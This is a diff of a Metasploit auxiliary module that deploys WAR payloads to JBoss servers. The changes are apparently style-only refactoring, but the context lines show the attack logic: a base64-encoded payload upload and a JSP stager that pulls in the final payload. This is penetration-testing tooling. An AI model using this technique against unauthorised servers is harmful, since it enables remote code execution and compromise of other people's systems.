@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,7 +7,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HTTP::JBoss
 
   def initialize
@@ -42,26 +42,27 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('APPBASE',    [ true,  'Application base name', 'payload']),
         OptPath.new('WARFILE',      [ false, 'The WAR file to deploy'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def deploy_action(app_base, war_data)
-    encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
+    encoded_payload = Rex::Text.encode_base64(war_data).delete("\n")
 
     if http_verb == 'POST'
       print_status("Deploying payload...")
       opts = {
-        :file => "#{app_base}.war",
-        :contents => encoded_payload
+        file: "#{app_base}.war",
+        contents: encoded_payload
       }
     else
       print_status("Deploying stager...")
       stager_name = Rex::Text.rand_text_alpha(8 + rand(8))
       stager_contents = stager_jsp(app_base)
       opts = {
-        :dir => "#{stager_name}.war",
-        :file => "#{stager_name}.war/#{stager_name}.jsp",
-        :contents => Rex::Text.encode_base64(stager_contents).gsub(/\n/, '')
+        dir: "#{stager_name}.war",
+        file: "#{stager_name}.war/#{stager_name}.jsp",
+        contents: Rex::Text.encode_base64(stager_contents).delete("\n")
       }
     end
 
@@ -78,7 +79,7 @@ class MetasploitModule < Msf::Auxiliary
     unless http_verb == 'POST'
       # call the stager to deploy our real payload war
       stager_uri = '/' + stager_name + '/' + stager_name + '.jsp'
-      payload_data = "#{Rex::Text.rand_text_alpha(8+rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
+      payload_data = "#{Rex::Text.rand_text_alpha(8 + rand(8))}=#{Rex::Text.uri_encode(encoded_payload)}"
       print_status("Calling stager #{stager_uri} to deploy final payload...")
       res = deploy('method' => 'POST',
                    'data'   => payload_data,
@@ -102,7 +103,6 @@ class MetasploitModule < Msf::Auxiliary
         print_good("Stager successfully removed")
       end
     end
-
   end
 
   def undeploy_action(app_base)
